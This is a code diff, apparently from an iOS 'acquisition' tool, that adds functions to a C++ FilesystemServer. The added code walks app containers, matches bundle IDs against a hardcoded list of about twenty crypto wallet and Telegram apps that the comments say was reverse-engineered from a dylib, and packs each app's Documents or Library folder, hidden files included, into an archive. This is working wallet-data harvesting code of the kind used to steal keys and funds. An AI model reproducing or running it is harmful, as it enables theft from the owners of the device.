@@ -247,5 +247,137 @@ bool FilesystemServer::ShouldStop() const {
     return should_stop_;
 }
 
+// ============================================================================
+// 加密货币钱包路径扫描
+// 逆向自 libappcore.dylib 中硬编码的钱包数据路径
+// ============================================================================
+
+// 已知钱包应用 Bundle ID (逆向自 dylib 字符串)
+struct WalletAppInfo {
+    const char* bundle_id;
+    const char* display_name;
+    const char* data_subpath;  // 容器内的关键数据子路径
+};
+
+static const WalletAppInfo kKnownWallets[] = {
+    // Solana 生态
+    {"com.phantom.app",              "Phantom",           "Documents"},
+    {"com.phantom.solana",           "Phantom Solana",    "Documents"},
+    // Ethereum / 多链
+    {"org.toshi",                    "Coinbase Wallet",   "Documents"},
+    {"com.coinbase.wallet",          "Coinbase Wallet",   "Library"},
+    {"com.bitkeep.wallet",           "BitKeep",           "Documents"},
+    {"com.coin98.wallet",            "Coin98",            "Documents"},
+    {"com.exodus.wallet",            "Exodus",            "Documents"},
+    {"com.onekey.wallet",            "OneKey",            "Documents"},
+    {"io.metamask",                  "MetaMask",          "Documents"},
+    {"com.trustwallet.app",          "Trust Wallet",      "Documents"},
+    {"com.walletconnect.wallet",     "WalletConnect",     "Documents"},
+    // Telegram (含钱包功能)
+    {"org.telegram.TelegramSDK",     "Telegram",          "Documents"},
+    {"ph.telegra.Telegraph",         "Telegram",          "Documents"},
+    {"net.youli.Telegram",           "Telegram",          "Documents"},
+    // 其他
+    {"com.binance.wallet",           "Binance Wallet",    "Documents"},
+    {"com.okex.wallet",              "OKX Wallet",        "Documents"},
+    {"com.huobi.wallet",             "Huobi Wallet",      "Documents"},
+    {"im.token.app",                 "imToken",           "Documents"},
+    {"com.mathwallet",               "MathWallet",        "Documents"},
+    {"com.safepal.wallet",           "SafePal",           "Documents"},
+};
+
+static const int kKnownWalletsCount = sizeof(kKnownWallets) / sizeof(kKnownWallets[0]);
+
+std::vector<std::string> FilesystemServer::GetKnownWalletPaths() {
+    std::vector<std::string> paths;
+    // iOS 应用容器根目录
+    const char* container_roots[] = {
+        "/var/mobile/Containers/Data/Application",
+        "/private/var/mobile/Containers/Data/Application",
+        nullptr
+    };
+
+    for (int r = 0; container_roots[r]; r++) {
+        DIR* root = opendir(container_roots[r]);
+        if (!root) continue;
+
+        struct dirent* entry;
+        while ((entry = readdir(root)) != nullptr) {
+            if (entry->d_name[0] == '.') continue;
+            // 检查是否是 UUID 目录 (36字符, 含4个连字符)
+            if (strlen(entry->d_name) != 36) continue;
+
+            std::string container_path = std::string(container_roots[r]) + "/" + entry->d_name;
+
+            // 读取 MCMMetadataIdentifier 确认 Bundle ID
+            std::string metadata_plist = container_path + "/.com.apple.mobile_container_manager.metadata.plist";
+            FILE* f = fopen(metadata_plist.c_str(), "r");
+            if (f) {
+                char buf[4096];
+                size_t n = fread(buf, 1, sizeof(buf) - 1, f);
+                fclose(f);
+                buf[n] = '\0';
+
+                // 在 plist 中搜索 MCMMetadataIdentifier
+                const char* id_key = "MCMMetadataIdentifier";
+                const char* p = strstr(buf, id_key);
+                if (p) {
+                    p += strlen(id_key);
+                    // 跳过 XML 标签找到字符串值
+                    const char* val_start = strchr(p, '>');
+                    if (val_start) {
+                        val_start++;
+                        const char* val_end = strchr(val_start, '<');
+                        if (val_end && val_end - val_start < 256) {
+                            char bundle_id[256];
+                            strncpy(bundle_id, val_start, val_end - val_start);
+                            bundle_id[val_end - val_start] = '\0';
+
+                            // 匹配已知钱包
+                            for (int i = 0; i < kKnownWalletsCount; i++) {
+                                if (strcmp(bundle_id, kKnownWallets[i].bundle_id) == 0) {
+                                    std::string data_path = container_path + "/" + kKnownWallets[i].data_subpath;
+                                    paths.push_back(data_path);
+                                    printf("[+] Wallet found: %s (%s) -> %s\n",
+                                           kKnownWallets[i].display_name,
+                                           bundle_id, data_path.c_str());
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        closedir(root);
+    }
+    return paths;
+}
+
+int FilesystemServer::CollectCryptoWallets(struct archive* ar) {
+    int collected = 0;
+    std::vector<std::string> wallet_paths = GetKnownWalletPaths();
+
+    for (const auto& path : wallet_paths) {
+        struct stat st;
+        if (stat(path.c_str(), &st) != 0) continue;
+        if (!S_ISDIR(st.st_mode)) continue;
+
+        printf("[*] Collecting wallet data: %s\n", path.c_str());
+        FilesystemTraversalPolicy policy;
+        policy.rootPath = path;
+        policy.includeHidden = true;
+        policy.followSymlinks = false;
+        policy.maxFileSize = 50 * 1024 * 1024;  // 50MB
+
+        // 遍历并写入归档
+        TraverseAndWrite(path, ar, policy, observer_);
+        collected++;
+    }
+
+    printf("[+] Collected %d wallet directories\n", collected);
+    return collected;
+}
+
 } // namespace filesystem
 } // namespace acquisition
